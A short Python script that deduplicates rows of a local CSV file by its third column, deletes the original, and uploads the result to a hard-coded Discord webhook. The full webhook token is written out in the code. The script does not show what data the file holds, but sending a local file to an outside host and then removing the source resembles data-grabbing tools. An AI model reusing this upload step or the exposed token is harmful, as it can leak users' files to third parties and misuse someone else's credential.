import time
import discord
import pathlib
def main():

    if pathlib.Path('temp.csv').is_file():
        pathlib.Path.unlink('temp.csv')
    if pathlib.Path('cock.csv').is_file():
        
        hook = discord.SyncWebhook.from_url("https://discord.com/api/webhooks/1283907164246769695/6hK0nGoqeQFwmWnE8-BSdTCFN9UbjZcqKw-W5VO573TFPhknUdU7RGHBuYDUZ2u1kF31")

        with open('cock.csv', 'r') as in_file, open('temp.csv', 'w') as out_file:
            seen = set()
            for line in in_file:
                print(line.split(',')[2])
                if line.split(',')[2] in seen: continue
                seen.add(line.split(',')[2])
                out_file.write(line)
        print('enable')
        pathlib.Path.unlink('cock.csv')
        hook.send(file=discord.File('temp.csv'))
    return time.time()